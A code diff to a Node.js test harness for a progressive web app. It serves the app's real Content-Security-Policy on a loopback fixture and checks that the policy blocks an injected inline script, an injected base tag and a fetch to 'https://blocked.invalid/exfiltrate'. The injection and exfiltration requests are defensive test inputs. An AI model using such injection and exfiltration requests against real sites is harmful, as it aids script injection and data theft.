@@ -8,6 +8,9 @@ const os = require('node:os');
 const {spawn} = require('node:child_process');
 const assert = require('node:assert/strict');
 const base = path.resolve(__dirname, '../frontend');
+// Exercise the exact CSP emitted by the Go middleware on the loopback fixture.
+const csp = fs.readFileSync(path.join(__dirname,'../internal/http/middleware/security.go'),'utf8')
+  .match(/h.Set\("Content-Security-Policy", "([^"]+)"\)/)[1];
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'ulaundry-pwa-'));
 const browser = process.env.PWA_BROWSER || 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe';
@@ -22,6 +25,8 @@ const server = http.createServer((req, res) => {
   if (outage) { req.socket.destroy(); return; }
   if (stalledNavigation && url.pathname === '/login.html') return;
   res.setHeader('Cache-Control', 'no-store');
+  res.setHeader('Content-Security-Policy', csp);
+  res.setHeader('X-Content-Type-Options', 'nosniff');
   if (url.pathname.startsWith('/api/') || url.pathname === '/private-receipt') {
     res.setHeader('Content-Type', url.pathname.includes('struk') ? 'text/html' : 'application/json');
     if (url.pathname === '/api/session') { res.statusCode = 401; res.end('{"error":{"code":"unauthenticated","message":"Sesi tidak aktif."}}'); return; }
@@ -33,7 +38,7 @@ const server = http.createServer((req, res) => {
   if (brokenInstall && url.pathname === '/icons/icon-512.png') { res.statusCode = 503; res.end('unavailable'); return; }
   res.setHeader('Content-Type', mime[path.extname(file)] || 'application/octet-stream');
   let data = fs.readFileSync(file);
-  if (url.pathname === '/sw.js') data = Buffer.from(data.toString().replace("2026-11-27-1", 'fixture-' + release));
+  if (url.pathname === '/sw.js') data = Buffer.from(data.toString().replace(/const VERSION = '[^']+';/, "const VERSION = 'fixture-" + release + "';"));
   if (url.pathname === '/login.js') {
     res.setHeader('Cache-Control', 'public, max-age=31536000');
     data = Buffer.from(data.toString() + '\nwindow.__pwaFixtureRelease=' + JSON.stringify(assetRelease) + ';');
@@ -108,6 +113,22 @@ async function main() {
   const cacheKeys = client => client.ev(`(async () => { const all = {}; for (const name of await caches.keys()) all[name] = (await (await caches.open(name)).keys()).map(r => r.url); return all; })()`);
   await a.send('Emulation.setDeviceMetricsOverride', {width:1280, height:960, deviceScaleFactor:1, mobile:false});
   await nav(a, '/login.html');
+  const policy = await a.ev(`(async () => {
+    const violations = [];
+    document.addEventListener('securitypolicyviolation', event => violations.push(event.effectiveDirective));
+    const script = document.createElement('script'); script.textContent = 'window.__injected=true'; document.body.appendChild(script);
+    const base = document.createElement('base'); base.href = 'https://blocked.invalid/'; document.head.appendChild(base);
+    const blocked = await fetch('https://blocked.invalid/exfiltrate').then(() => false, () => true);
+    await new Promise(resolve => setTimeout(resolve,100));
+    script.remove(); base.remove();
+    document.getElementById('togglePassword').click();
+    const visible = getComputedStyle(document.getElementById('eyeClosed')).display !== 'none' && document.getElementById('password').type === 'text';
+    document.getElementById('togglePassword').click();
+    return {injected:!!window.__injected,blocked,violations,visible};
+  })()`);
+  assert.equal(policy.injected, false); assert.equal(policy.blocked, true); assert.equal(policy.visible, true);
+  for (const directive of ['script-src-elem','base-uri','connect-src']) assert(policy.violations.includes(directive));
+  console.log('PASS exact server CSP blocks inline script, base injection and external connection; password toggle works');
   await wait(() => a.ev('!!navigator.serviceWorker.controller'), 'first service worker control');
   assert.equal(await a.ev('(await navigator.serviceWorker.getRegistration()).updateViaCache'), 'none');
   assert.equal(await a.ev('(await navigator.serviceWorker.getRegistration()).scope'), origin + '/');
